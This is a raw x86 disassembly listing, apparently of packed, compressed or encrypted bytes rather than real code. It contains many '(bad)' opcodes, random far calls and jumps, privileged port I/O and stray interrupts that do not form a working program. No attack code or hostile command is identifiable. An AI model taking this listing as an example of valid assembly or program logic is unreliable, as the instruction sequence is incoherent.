  43cdbd:	mov    bl,cl
  43cdbf:	inc    edx
  43cdc0:	inc    ebp
  43cdc1:	or     ebx,DWORD PTR [edx]
  43cdc3:	sub    al,0x7
  43cdc5:	pusha  
  43cdc6:	popa   
  43cdc7:	mov    bl,0x50
  43cdc9:	mov    ds:0x18ee1b9d,al
  43cdce:	jle    0x43cd6a
  43cdd0:	rol    BYTE PTR [eax+edx*1],cl
  43cdd3:	mov    edi,0x46baf0fd
  43cdd8:	das    
  43cdd9:	jp     0x43ce35
  43cddb:	mov    al,ds:0x974605c0
  43cde0:	xchg   ebx,eax
  43cde1:	or     ebp,DWORD PTR [ebp-0x75]
  43cde4:	push   ecx
  43cde5:	mov    bl,0x9a
  43cde7:	jbe    0x43cde6
  43cde9:	mov    edx,0x5613844a
  43cdee:	push   ss
  43cdef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cdf0:	cmc    
  43cdf1:	outs   dx,DWORD PTR ds:[esi]
  43cdf2:	mov    edx,0xdf0f95de
  43cdf7:	cld    
  43cdf8:	xchg   esp,eax
  43cdf9:	stc    
  43cdfa:	add    DWORD PTR [eax],esp
  43cdfc:	mov    dl,0x9f
  43cdfe:	xlat   BYTE PTR ds:[ebx]
  43cdff:	call   0xa78a16bf
  43ce04:	inc    ebx
  43ce05:	jmp    0xedd52754
  43ce0a:	in     eax,dx
  43ce0b:	pop    esi
  43ce0c:	mov    bl,0x17
  43ce0e:	fisubr DWORD PTR [edi+eax*1-0x19]
  43ce12:	enter  0xd2c0,0xe6
  43ce16:	add    al,0xa7
  43ce18:	in     al,dx
  43ce19:	mov    ebp,0xef16945c
  43ce1e:	clc    
  43ce1f:	shl    BYTE PTR [edx+0xd57d4],1
  43ce25:	xchg   esi,eax
  43ce26:	mov    al,ds:0x920b120a
  43ce2b:	and    ch,0xa
  43ce2e:	xchg   edi,eax
  43ce2f:	rcr    DWORD PTR [esi],0x80
  43ce32:	call   0xd375:0x14eb6ce4
  43ce39:	or     eax,0x785ca79d
  43ce3e:	pop    ss
  43ce3f:	jecxz  0x43cdf7
  43ce41:	scas   al,BYTE PTR es:[edi]
  43ce42:	mov    dh,0x72
  43ce44:	mov    dl,0x8b
  43ce46:	sbb    eax,0x27bf4e1e
  43ce4b:	repnz ror BYTE PTR [ebx],1
  43ce4e:	xchg   BYTE PTR [ebx+0x42],bh
  43ce51:	push   ds
  43ce52:	cvtps2pd xmm1,QWORD PTR [edi+ebp*8-0x66]
  43ce57:	popa   
  43ce58:	pop    ebp
  43ce59:	dec    ecx
  43ce5a:	jns    0x43ce43
  43ce5c:	add    DWORD PTR [ecx],esp
  43ce5e:	mov    cl,0xa8
  43ce60:	mov    cl,BYTE PTR [edi-0x7a]
  43ce63:	xchg   edi,eax
  43ce64:	mov    bh,0x9a
  43ce66:	cmp    BYTE PTR [edi],ah
  43ce68:	out    dx,eax
  43ce69:	inc    esi
  43ce6a:	sub    cl,dh
  43ce6c:	mov    eax,ds:0xbdf57f83
  43ce71:	push   esi
  43ce72:	jl     0x43ce2f
  43ce74:	mov    eax,ds:0x181720a3
  43ce79:	cmp    ch,BYTE PTR [eax+0x63]
  43ce7c:	mov    dl,0x5c
  43ce7e:	xchg   BYTE PTR [edx+edi*2-0x641a0e24],bh
  43ce85:	add    dl,ch
  43ce87:	rcl    BYTE PTR [ebp-0x16cee2ad],cl
  43ce8d:	add    al,0xba
  43ce8f:	fcomp  QWORD PTR [edi+0x12ae3db1]
  43ce95:	cld    
  43ce96:	xchg   esi,eax
  43ce97:	xchg   DWORD PTR [edx-0x47c55e8],esi
  43ce9d:	test   al,ah
  43ce9f:	mov    cl,0x8e
  43cea1:	or     edi,DWORD PTR [esi+0x3e]
  43cea4:	scas   al,BYTE PTR es:[edi]
  43cea5:	xor    eax,0x4efeca6f
  43ceaa:	call   0x7a79:0x8acc345b
  43ceb1:	in     eax,0x6b
  43ceb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ceb4:	xor    DWORD PTR [esi-0x3e],ebp
  43ceb7:	into   
  43ceb8:	aaa    
  43ceb9:	out    dx,eax
  43ceba:	test   BYTE PTR [edi],bl
  43cebc:	mov    dl,0xf1
  43cebe:	mov    eax,0x85c87c75
  43cec3:	lahf   
  43cec4:	mov    bh,0x14
  43cec6:	call   0xe48f2b89
  43cecb:	outs   dx,BYTE PTR ds:[esi]
  43cecc:	dec    ecx
  43cecd:	mov    ch,0x9d
  43cecf:	pop    es
  43ced0:	mov    bh,0x78
  43ced2:	push   es
  43ced3:	xchg   edi,eax
  43ced4:	(bad)  
  43ced5:	int3   
  43ced6:	pop    edx
  43ced7:	scas   eax,DWORD PTR es:[edi]
  43ced8:	cmp    dl,BYTE PTR [edx-0x74]
  43cedb:	mov    cl,0x62
  43cedd:	lods   eax,DWORD PTR ds:[esi]
  43cede:	push   ebp
  43cedf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cee0:	xor    edi,DWORD PTR [esi]
  43cee2:	dec    ebp
  43cee3:	clc    
  43cee4:	es scas al,BYTE PTR es:[edi]
  43cee6:	call   0xfa32:0x6e1cbee
  43ceed:	adc    BYTE PTR [ebx-0x58afa559],0xaf
  43cef4:	or     ebp,ebp
  43cef6:	das    
  43cef7:	sbb    eax,0xebe4eab2
  43cefc:	jmp    0x43cf4d
  43cefe:	popaw  
  43cf00:	jns    0x43cf0e
  43cf02:	fs mov al,0x15
  43cf05:	push   edi
  43cf06:	repz xchg edi,eax
  43cf08:	jo     0x43cf0b
  43cf0a:	push   esi
  43cf0b:	sbb    DWORD PTR [edx+0x2299f66a],esi
  43cf11:	inc    ebx
  43cf12:	pop    edi
  43cf13:	sub    eax,0x38b10bff
  43cf18:	fadd   QWORD PTR [edi-0x51]
  43cf1b:	popa   
  43cf1c:	sub    cl,BYTE PTR [edi+0x1e338d9a]
  43cf22:	jnp    0x43cee1
  43cf24:	adc    DWORD PTR [esi+0x63],edx
  43cf27:	lahf   
  43cf28:	retf   
  43cf29:	in     eax,0xa2
  43cf2b:	cmc    
  43cf2c:	xor    cl,BYTE PTR [eax]
  43cf2e:	sbb    ah,BYTE PTR [edx]
  43cf30:	jmp    0x43cf49
  43cf32:	lea    eax,[edi-0x4e]
  43cf35:	loope  0x43cf45
  43cf37:	xchg   edx,eax
  43cf38:	stos   DWORD PTR es:[edi],eax
  43cf39:	and    esi,DWORD PTR [edi+0x170b0c4a]
  43cf3f:	cs dec edi
  43cf41:	sbb    DWORD PTR [ebp+0x41],eax
  43cf44:	lea    ebx,[edx+ebx*4-0x63]
  43cf48:	mov    bh,0x14
  43cf4a:	push   DWORD PTR [edx+0x3]
  43cf4d:	adc    eax,0x883ea703
  43cf52:	and    bl,BYTE PTR [ebx+0x2f4ed534]
  43cf58:	mov    dl,0x2b
  43cf5a:	jbe    0x43cf52
  43cf5c:	mov    ebp,es
  43cf5e:	jl     0x43cfa4
  43cf60:	lods   al,BYTE PTR ds:[esi]
  43cf61:	or     ecx,DWORD PTR [eax-0x51]
  43cf64:	cmp    dl,bl
  43cf66:	(bad)  
  43cf67:	(bad)  
  43cf69:	aas    
  43cf6a:	call   0xc4eb:0x6a275a8
  43cf71:	imul   edi,DWORD PTR [ebp-0x23],0x53
  43cf75:	or     eax,DWORD PTR [ebp+0x32]
  43cf78:	loope  0x43cf52
  43cf7a:	(bad)  [ebx+0x21]
  43cf7d:	ja     0x43cf19
  43cf7f:	xchg   ebp,eax
  43cf80:	shl    BYTE PTR [edx],0x15
  43cf83:	adc    BYTE PTR [edx],bl
  43cf85:	(bad)  
  43cf86:	shl    BYTE PTR [edi-0x21c909c],cl
  43cf8c:	adc    al,0xa6
  43cf8e:	in     eax,dx
  43cf8f:	out    0xc1,al
  43cf91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cf92:	in     eax,dx
  43cf93:	dec    edx
  43cf94:	lods   al,BYTE PTR ds:[esi]
  43cf95:	shl    BYTE PTR [ecx],0xc7
  43cf98:	aam    0xd8
  43cf9a:	call   0x15b8:0x35c6d1f3
  43cfa1:	add    al,0x6b
  43cfa3:	lea    ebp,[edi+0x65]
  43cfa6:	mov    esi,0xb2cbe3f0
  43cfab:	pop    edi
  43cfac:	jl     0x43cf7d
  43cfae:	call   0xd6d0:0xe8825d89
  43cfb5:	push   esi
  43cfb6:	push   ebx
  43cfb7:	sahf   
  43cfb8:	aaa    
  43cfb9:	rcr    DWORD PTR [edx],1
  43cfbb:	pop    ebx
  43cfbc:	shl    BYTE PTR [edi],cl
  43cfbe:	outs   dx,BYTE PTR ds:[esi]
  43cfbf:	clc    
  43cfc0:	in     al,dx
  43cfc1:	cmp    BYTE PTR [ecx+edx*1+0x27ed1ad1],dl
  43cfc8:	cli    
  43cfc9:	inc    edi
  43cfca:	push   edx
  43cfcb:	mov    edi,0x4bc00bc7
  43cfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cfd1:	gs mov esi,0x9ae23613
  43cfd7:	or     BYTE PTR [eax],dh
  43cfd9:	or     al,0xc7
  43cfdb:	dec    eax
  43cfdc:	fist   DWORD PTR [ecx]
  43cfde:	stos   BYTE PTR es:[edi],al
  43cfdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cfe0:	inc    edx
  43cfe1:	push   es
  43cfe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cfe3:	hlt    
  43cfe4:	jp     0x43cfa3
  43cfe6:	lahf   
  43cfe7:	out    dx,al
  43cfe8:	mov    ch,0x76
  43cfea:	mov    dl,0xd8
  43cfec:	and    al,0x90
  43cfee:	dec    edx
  43cfef:	push   ebp
  43cff0:	mov    DWORD PTR [esi+0x4f],edx
  43cff3:	test   al,0x69
  43cff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cff6:	int3   
  43cff7:	cmp    DWORD PTR [edx+0x5f83f7d5],esi
  43cffd:	or     BYTE PTR [eax-0x2b],dh
  43d000:	mov    bl,0xaf
  43d002:	mov    ds:0x971acf9c,al
  43d007:	pop    ecx
  43d008:	pop    ax
  43d00a:	mov    bh,0xae
  43d00c:	es dec edx
  43d00e:	stos   DWORD PTR es:[edi],eax
  43d00f:	stos   DWORD PTR es:[edi],eax
  43d010:	xor    dh,BYTE PTR [esi-0x6]
  43d013:	add    dl,BYTE PTR [eax]
  43d015:	xchg   DWORD PTR [ebp+0x1740db4e],ebx
  43d01b:	daa    
  43d01c:	ja     0x43d017
  43d01e:	cwde   
  43d01f:	jns    0x43d036
  43d021:	sahf   
  43d022:	mov    ah,0xc4
  43d024:	mov    al,ds:0xfce27bfb
  43d029:	jbe    0x43d064
  43d02b:	mov    eax,0xdc40360a
  43d030:	xor    al,BYTE PTR [eax+0xc]
  43d033:	jns    0x43d051
  43d035:	inc    esi
  43d036:	imul   ebx,DWORD PTR [ecx-0x4e],0x7c1d1a63
  43d03d:	mov    ds:0xaa67649,al
  43d042:	loopne 0x43d090
  43d044:	jmp    0x1a20:0xf4ce0010
  43d04b:	and    DWORD PTR [ecx-0x4d],ebp
  43d04e:	push   edx
  43d04f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d050:	mov    gs,WORD PTR [ebx]
  43d052:	add    DWORD PTR cs:[ebx],esi
  43d055:	(bad)  
  43d056:	cmc    
  43d057:	jp     0x43d008
  43d059:	int    0xbb
  43d05b:	out    0x32,al
  43d05d:	adc    BYTE PTR [ebp-0x49],cl
  43d060:	inc    ebx
  43d061:	popf   
  43d062:	daa    
  43d063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d064:	pop    esp
  43d065:	mul    BYTE PTR [eax-0x72]
  43d068:	pop    ss
  43d069:	retf   
  43d06a:	xchg   ebp,eax
  43d06b:	shl    BYTE PTR [edx-0x75cadbb7],cl
  43d071:	push   edx
  43d072:	adc    edx,esp
  43d074:	or     bx,WORD PTR [ebx*1-0x6773ba99]
  43d07c:	shl    BYTE PTR [ecx-0x6b],cl
  43d07f:	stc    
  43d080:	in     al,0xa9
  43d082:	pop    ecx
  43d083:	fcomp  DWORD PTR [edi+ebx*2]
  43d086:	xchg   esp,eax
  43d087:	js     0x43d032
  43d089:	mov    edi,DWORD PTR [edx]
  43d08b:	test   BYTE PTR [edx],0xf8
  43d08e:	rcl    dh,cl
  43d090:	add    DWORD PTR [ebx+ebx*8],eax
  43d093:	fisubr DWORD PTR [eax+0x75c27547]
  43d099:	fimul  DWORD PTR ds:0x651052c8
  43d09f:	jl     0x43d098
  43d0a1:	push   esi
  43d0a2:	call   0xe766:0xd9d7d2a6
  43d0a9:	and    edi,ebp
  43d0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d0ac:	pusha  
  43d0ad:	std    
  43d0ae:	fadd   QWORD PTR ds:[ecx+0x77]
  43d0b2:	mov    ds:0xe3e7b522,eax
  43d0b7:	jge    0x43d112
  43d0b9:	jge    0x43d095
  43d0bb:	push   0x1a
  43d0bd:	inc    ebp
  43d0be:	or     edi,edi
  43d0c0:	inc    esi
  43d0c1:	adc    DWORD PTR [ebp+eiz*2+0x4bfa9942],0xffffffeb
  43d0c9:	popa   
  43d0ca:	stos   DWORD PTR es:[edi],eax
  43d0cb:	xchg   esp,eax
  43d0cc:	mov    dl,0xcd
  43d0ce:	arpl   WORD PTR [edi],cx
  43d0d0:	ds stc 
  43d0d2:	mov    dl,0x21
  43d0d4:	or     BYTE PTR [eax],0x4c
  43d0d7:	das    
  43d0d8:	lds    edx,FWORD PTR [edx]
  43d0da:	rcr    DWORD PTR [ecx+0x12],1
  43d0dd:	adc    al,0xe9
  43d0df:	loopne 0x43d093
  43d0e1:	dec    eax
  43d0e2:	or     bl,BYTE PTR [edi]
  43d0e4:	push   edi
  43d0e5:	mov    ds:0x3670d60f,eax
  43d0ea:	sbb    eax,0x207fbcb1
  43d0ef:	mov    ds:0x41803952,al
  43d0f4:	xlat   BYTE PTR ds:[ebx]
  43d0f5:	dec    edi
  43d0f6:	xchg   ebx,eax
  43d0f7:	stos   BYTE PTR es:[edi],al
  43d0f8:	ss js  0x43d086
  43d0fb:	daa    
  43d0fc:	or     ah,BYTE PTR [eax-0x76]
  43d0ff:	jo     0x43d0bb
  43d101:	or     BYTE PTR [eax+ecx*1+0x603e623],cl
  43d108:	sub    bl,BYTE PTR [ebx+edx*1]
  43d10b:	push   0x3cfa808e
  43d110:	cmp    bl,BYTE PTR [edx+0x24]
  43d113:	aaa    
  43d114:	data16 xor al,0x8c
  43d117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d118:	mov    al,0xf7
  43d11a:	lds    esi,FWORD PTR [esi+0x62]
  43d11d:	pop    esp
  43d11e:	aas    
  43d11f:	(bad)  
  43d120:	mov    dl,0xa9
  43d122:	cld    
  43d123:	push   edi
  43d124:	(bad)  
  43d126:	(bad)  
  43d127:	push   eax
  43d128:	cmp    cl,BYTE PTR [ebx]
  43d12a:	fild   WORD PTR [esi-0x5f]
  43d12d:	bound  edx,QWORD PTR [ebp-0x652badab]
  43d133:	mov    ch,0x77
  43d135:	pop    ebp
  43d136:	inc    ecx
  43d137:	jae    0x43d0c0
  43d139:	or     eax,0x3650a351
  43d13e:	hlt    
  43d13f:	shl    BYTE PTR [ebx+ecx*4-0x56],1
  43d143:	pop    es
  43d144:	adc    DWORD PTR [edx-0x13],0xea64b287
  43d14b:	pop    edx
  43d14c:	xor    esi,DWORD PTR [edi]
  43d14e:	int    0x96
  43d150:	or     ecx,DWORD PTR [ebx]
  43d152:	sub    edi,DWORD PTR [edx+0x3831365e]
  43d158:	dec    esp
  43d159:	imul   ebx,DWORD PTR [edx+0x22c271a4],0x79
  43d160:	jmp    0x5f8dbf43
  43d165:	or     ecx,DWORD PTR [edi+0x4704e500]
  43d16b:	ss inc edi
  43d16d:	jmp    0xa997310c
  43d172:	sbb    edx,DWORD PTR [ebp-0x6a]
  43d175:	sbb    DWORD PTR [ecx],ebx
  43d177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d178:	addr16 xchg esi,eax
  43d17a:	mov    fs,WORD PTR [edi]
  43d17c:	jns    0x43d119
  43d17e:	mov    ebp,0xe570b521
  43d183:	clc    
  43d184:	add    DWORD PTR [edi+0x29],0xffffff82
  43d188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d189:	retf   
  43d18a:	inc    ecx
  43d18b:	push   eax
  43d18c:	or     edx,DWORD PTR [edi]
  43d18e:	dec    edx
  43d18f:	xor    ecx,DWORD PTR [esi-0x35]
  43d192:	jnp    0x43d1f6
  43d194:	cs (bad) 
  43d196:	adc    DWORD PTR [eax-0x44],esi
  43d199:	scas   eax,DWORD PTR es:[edi]
  43d19a:	enter  0x7e9,0xab
  43d19e:	stc    
  43d19f:	adc    DWORD PTR [eax+0x46],ecx
  43d1a2:	shl    BYTE PTR [edi+0x47f02a1b],0x6a
  43d1a9:	outs   dx,DWORD PTR ds:[esi]
  43d1aa:	adc    bl,al
  43d1ac:	mov    dl,0x73
  43d1ae:	cld    
  43d1af:	mov    ah,BYTE PTR [eax-0x74]
  43d1b2:	add    DWORD PTR [ecx+0x9],esi
  43d1b5:	mov    ebx,0x5390d509
  43d1ba:	jnp    0x43d198
  43d1bc:	mov    dl,0x38
  43d1be:	bndstx [eax],bnd3
  43d1c1:	mov    ch,0x3d
  43d1c3:	iret   
  43d1c4:	mov    dl,0xe
  43d1c6:	std    
  43d1c7:	shl    DWORD PTR [ecx],cl
  43d1c9:	and    ah,BYTE PTR [eax]
  43d1cb:	xchg   ebp,eax
  43d1cc:	push   0xb
  43d1ce:	das    
  43d1cf:	cmp    DWORD PTR [edi],ebp
  43d1d1:	mov    ecx,0xfc9182c5
  43d1d6:	call   0xa5ea:0x37e0d5ce
  43d1dd:	scas   al,BYTE PTR es:[edi]
  43d1de:	rcr    BYTE PTR [edx+ebp*2-0x7da4f886],1
  43d1e5:	dec    ebx
  43d1e6:	in     eax,0x33
  43d1e8:	sbb    eax,0x58e0f38a
  43d1ed:	or     bl,BYTE PTR [edx-0x3a86eb4]
  43d1f3:	popa   
  43d1f4:	push   edi
  43d1f5:	in     eax,dx
  43d1f6:	bound  esi,QWORD PTR [ecx-0x5b86de3f]
  43d1fc:	inc    esi
  43d1fd:	cmc    
  43d1fe:	xor    bl,BYTE PTR [esi-0x5124b7f6]
  43d204:	mov    dl,0xd0
  43d206:	or     edi,edx
  43d208:	pushf  
  43d209:	mov    ?,WORD PTR [esi]
  43d20b:	and    BYTE PTR [ebx+0xb],cl
  43d20e:	add    eax,0x89362a0
  43d213:	or     eax,0x7f7d830b
  43d218:	jb     0x43d22e
  43d21a:	loopne 0x43d276
  43d21c:	mov    dl,0x86
  43d21e:	or     DWORD PTR [eax+0x108e04bf],esi
  43d224:	mov    ecx,0x3c4ee60b
  43d229:	mov    cl,0x3a
  43d22b:	dec    edx
  43d22c:	mov    bl,0xde
  43d22e:	call   0x5d26:0x37a3cbec
  43d235:	data16 cmc 
  43d237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d238:	stos   BYTE PTR es:[edi],al
  43d239:	icebp  
  43d23a:	push   es
  43d23b:	outs   dx,DWORD PTR ds:[esi]
  43d23c:	xor    ebp,0x73
  43d23f:	adc    DWORD PTR [eax+0x12],ebx
  43d242:	call   0x2a29:0xc7d93656
  43d249:	mov    dh,0x9c
  43d24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d24c:	pop    esp
  43d24d:	outs   dx,BYTE PTR ds:[esi]
  43d24e:	test   BYTE PTR [ebp+0x55e0a920],dh
  43d254:	mov    dl,0xe7
  43d256:	stos   BYTE PTR es:[edi],al
  43d257:	retf   
  43d258:	mov    esp,0x307322c9
  43d25d:	or     ebx,DWORD PTR [ebx]
  43d25f:	add    edx,ecx
  43d261:	mov    ds:0x93d35c39,al
  43d266:	call   0xdeca:0x4590dcce
  43d26d:	cmp    edx,DWORD PTR [ebx]
  43d26f:	mov    al,ds:0xe0a02772
  43d274:	popa   
  43d275:	test   dl,bl
  43d277:	bound  esp,QWORD PTR [ebx]
  43d279:	ins    BYTE PTR es:[edi],dx
  43d27a:	pop    es
  43d27b:	inc    ecx
  43d27c:	mov    dl,0x9c
  43d27e:	sub    ebp,edi
  43d280:	dec    edx
  43d281:	and    al,0x8e
  43d283:	call   0x294dd2e5
  43d288:	jnp    0x43d274
  43d28a:	sbb    dh,BYTE PTR [ebx]
  43d28c:	(bad)  
  43d28e:	call   0xd464c16e
  43d293:	mov    al,ds:0x2aec51b9
  43d298:	jmp    0x43d26d
  43d29a:	ret    
  43d29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d29c:	not    BYTE PTR [edi+0x19]
  43d29f:	shl    BYTE PTR [eax],cl
  43d2a1:	aad    0xf2
  43d2a3:	fs mov dl,0x9e
  43d2a6:	push   0x4c67e718
  43d2ab:	stc    
  43d2ac:	inc    esi
  43d2ad:	or     esp,DWORD PTR [ecx+0x26d40776]
  43d2b3:	loope  0x43d2b4
  43d2b5:	pop    es
  43d2b6:	in     al,0xaa
  43d2b8:	mov    eax,0x593cb71e
  43d2bd:	rcr    BYTE PTR [ebx+0x10d2a43f],0xbe
  43d2c4:	dec    ebp
  43d2c5:	xchg   ebx,eax
  43d2c6:	and    al,0xa
  43d2c8:	gs in  al,0xfb
  43d2cb:	daa    
  43d2cc:	pop    esi
  43d2cd:	pcmpeqw mm2,QWORD PTR [edi+0x5c]
  43d2d1:	or     esi,DWORD PTR [eax]
  43d2d3:	rcl    DWORD PTR [ecx+0x23],1
  43d2d6:	inc    ecx
  43d2d7:	and    al,0x17
  43d2d9:	xchg   esi,eax
  43d2da:	call   0xf512:0xc48aebe3
  43d2e1:	icebp  
  43d2e2:	sub    edx,edx
  43d2e4:	pop    edi
  43d2e5:	or     esp,DWORD PTR [eax-0x56c9f20c]
  43d2eb:	lock int3 
  43d2ed:	inc    esi
  43d2ee:	call   0x6621:0x84c84583
  43d2f5:	call   0x57287ace
  43d2fa:	mov    bl,0x17
  43d2fc:	inc    esp
  43d2fd:	sbb    BYTE PTR ds:[edx+0x139aad2a],ah
  43d304:	sbb    edi,DWORD PTR [edi-0x7f]
  43d307:	jno    0x43d32a
  43d309:	push   ds
  43d30a:	jle    0x43d2b3
  43d30c:	xchg   esp,eax
  43d30d:	jp     0x43d311
  43d30f:	scas   eax,DWORD PTR es:[edi]
  43d310:	int    0x4
  43d312:	addr16 das 
  43d314:	mov    dl,0x25
  43d316:	xchg   ebx,eax
  43d317:	cmp    dl,bl
  43d319:	(bad)  
  43d31b:	sbb    DWORD PTR [ebp+esi*1-0x794d2b7c],ecx
  43d322:	dec    edx
  43d323:	add    eax,0xefed34f5
  43d328:	mov    dl,0xe
  43d32a:	fiadd  WORD PTR [eax+eiz*8]
  43d32d:	gs push eax
  43d32f:	stc    
  43d330:	addr16 or al,0x7a
  43d333:	or     eax,0xd75db242
  43d338:	adc    al,0x68
  43d33a:	sub    eax,0xbafb233
  43d33f:	ret    
  43d340:	fwait
  43d341:	dec    eax
  43d342:	sub    ebp,esi
  43d344:	inc    esp
  43d345:	pop    ss
  43d346:	dec    ebp
  43d347:	outs   dx,DWORD PTR ds:[esi]
  43d348:	or     BYTE PTR [ebx+0x1c47b8e3],0x6b
  43d34f:	imul   edi,DWORD PTR [ebp+edx*8-0x3320df32],0x74
  43d357:	inc    edi
  43d358:	ret    0x3f4a
  43d35b:	mov    dh,0x50
  43d35d:	repz or al,0xa7
  43d360:	pop    ebx
  43d361:	pusha  
  43d362:	pop    edi
  43d363:	jno    0x43d2ff
  43d365:	xor    BYTE PTR [esi-0x70],0xbb
  43d369:	add    BYTE PTR [esi-0x57],bl
  43d36c:	fisttp WORD PTR [ebx-0x9307f8f]
  43d372:	jmp    0x5e97:0xbf73aaa7
  43d379:	or     bh,BYTE PTR [ecx]
  43d37b:	ret    0xbcc1
  43d37e:	call   0xafc0:0x3d69ea4d
  43d385:	xchg   ecx,eax
  43d386:	add    eax,0x91b1c5a7
  43d38b:	mov    bh,0x18
  43d38d:	lahf   
  43d38e:	push   0xffffffbe
  43d390:	mov    dl,0x7e
  43d392:	(bad)  [ebx]
  43d394:	and    eax,0xece9635
  43d399:	or     edi,DWORD PTR [edx-0x7ad303ea]
  43d39f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d3a0:	sbb    ebx,DWORD PTR [edx-0x66]
  43d3a3:	ret    
  43d3a4:	shr    BYTE PTR ds:0x65d2a045,0x3c
  43d3ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d3ac:	int    0xa3
  43d3ae:	test   al,0x8a
  43d3b0:	cmp    DWORD PTR [esi-0x4e],edx
  43d3b3:	xchg   edi,eax
  43d3b4:	inc    esi
  43d3b5:	sahf   
  43d3b6:	mov    esi,0x9a964970
  43d3bb:	pushf  
  43d3bc:	xchg   edi,eax
  43d3bd:	or     al,0x6f
  43d3bf:	cmp    ah,0xb
  43d3c2:	bound  ebx,QWORD PTR [ebx+0x296a1abf]
  43d3c8:	sub    BYTE PTR [edx+ebx*4+0x5a4ad4d6],bl
  43d3cf:	xchg   edx,eax
  43d3d0:	lods   eax,DWORD PTR ds:[esi]
  43d3d1:	adc    bl,BYTE PTR [esi+0x382233a7]
  43d3d7:	adc    al,0x2f
  43d3d9:	inc    edx
  43d3da:	div    ebx
  43d3dc:	int    0xe7
  43d3de:	call   0xa463:0xa5e1ee94
  43d3e5:	cmp    esp,DWORD PTR cs:[esi+ebp*4-0x1be875b0]
  43d3ed:	aas    
  43d3ee:	cmp    bl,BYTE PTR [ebp+ebp*1-0x4]
  43d3f2:	call   0x42f2:0xe7da155e
  43d3f9:	out    dx,eax
  43d3fa:	xchg   BYTE PTR [esi-0x66ee318c],ah
  43d400:	jmp    FWORD PTR [ebx]
  43d402:	mulps  xmm6,XMMWORD PTR [ebx]
  43d405:	mov    cl,0x2d
  43d407:	les    edi,FWORD PTR [ebp+0x4c]
  43d40a:	adc    al,BYTE PTR [edi]
  43d40c:	or     eax,0x5a1bbd76
  43d411:	ds jbe 0x43d45f
  43d414:	mov    dl,0x88
  43d416:	pop    ss
  43d417:	fcom   DWORD PTR [ebp+edx*2+0x7c23a67c]
  43d41e:	mov    eax,ds:0xd720b8a7
  43d423:	(bad)  
  43d426:	or     al,0x77
  43d428:	mov    dl,0x4c
  43d42a:	pop    ss
  43d42b:	out    0xd1,al
  43d42d:	adc    al,0xa0
  43d42f:	sub    ecx,DWORD PTR [ebp-0x4de47ebd]
  43d435:	ds inc edi
  43d437:	xor    dl,BYTE PTR [ecx+eax*1]
  43d43a:	dec    ebx
  43d43b:	cmp    DWORD PTR [ebp+0x46a73340],ecx
  43d441:	sbb    ebx,DWORD PTR [ebx-0x6b]
  43d444:	sub    eax,0xfea63704
  43d449:	shl    DWORD PTR [ebx+0x36],cl
  43d44c:	js     0x43d415
  43d44e:	pop    edx
  43d44f:	jg     0x43d462
  43d451:	cmc    
  43d452:	call   0x42f0:0x726c7cc9
  43d459:	and    DWORD PTR [edi-0x60],ecx
  43d45c:	ret    0xdc22
  43d45f:	push   eax
  43d460:	xchg   edi,eax
  43d461:	imul   ebx,DWORD PTR [ecx-0x53],0x2e
  43d465:	jmp    0xea22:0x7e1bae9d
  43d46c:	push   edx
  43d46d:	repnz (bad) 
  43d46f:	out    dx,al
  43d470:	jmp    0x43d47d
  43d472:	das    
  43d473:	(bad)
  43d476:	xchg   edx,eax
  43d477:	fs pop ss
  43d479:	mov    dl,0x99
  43d47b:	sub    al,0x5d
  43d47d:	mov    es:0xc18b2e2b,al
  43d483:	pop    ecx
  43d484:	cld    
  43d485:	jb     0x43d49e
  43d487:	mov    ds:0xe0aba37d,eax
  43d48c:	push   edi
  43d48d:	mov    eax,ebp
  43d48f:	jb     0x43d50d
  43d491:	mov    eax,ds:0xfadd999a
  43d496:	int    0x6f
  43d498:	inc    ebp
  43d499:	nop
  43d49a:	(bad)  
  43d49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d49c:	dec    eax
  43d49d:	test   BYTE PTR [edi+eax*2],dh
  43d4a0:	fwait
  43d4a1:	out    0xee,al
  43d4a3:	retf   
  43d4a4:	xchg   esi,eax
  43d4a5:	adc    eax,0x7eb253cb
  43d4aa:	lea    edi,[edx-0x58f011f9]
  43d4b0:	ja     0x43d4df
  43d4b2:	mov    bh,0xc5
  43d4b4:	ret    0xd182
  43d4b7:	fs mov dl,0x61
  43d4ba:	sub    eax,0xab6dd1d4
  43d4bf:	sbb    eax,0x65d30b1b
  43d4c4:	cmp    BYTE PTR [ebx],bl
  43d4c6:	mov    DWORD PTR [ecx+0x4c],ebp
  43d4c9:	adc    al,0x9a
  43d4cb:	and    BYTE PTR [ecx+0x5d],ah
  43d4ce:	mov    fs,eax
  43d4d0:	mov    ebx,0xa51719d1
  43d4d5:	or     eax,ebp
  43d4d7:	adc    al,0x78
  43d4d9:	push   edx
  43d4da:	aad    0xd7
  43d4dc:	add    edi,DWORD PTR [edi+0x50cceb9d]
  43d4e2:	enter  0x3269,0xb1
  43d4e6:	and    DWORD PTR [esp+eiz*2],ebp
  43d4e9:	or     DWORD PTR [ebx+eax*2+0x16],esp
  43d4ed:	sub    DWORD PTR [ecx],esi
  43d4ef:	inc    esi
  43d4f0:	repnz pushf 
  43d4f2:	scas   eax,DWORD PTR es:[edi]
  43d4f3:	leave  
  43d4f4:	mov    dl,0x6e
  43d4f6:	mov    ecx,0x760448ed
  43d4fb:	imul   DWORD PTR [ebx+ecx*1]
  43d4fe:	or     BYTE PTR [esp+edx*4],dh
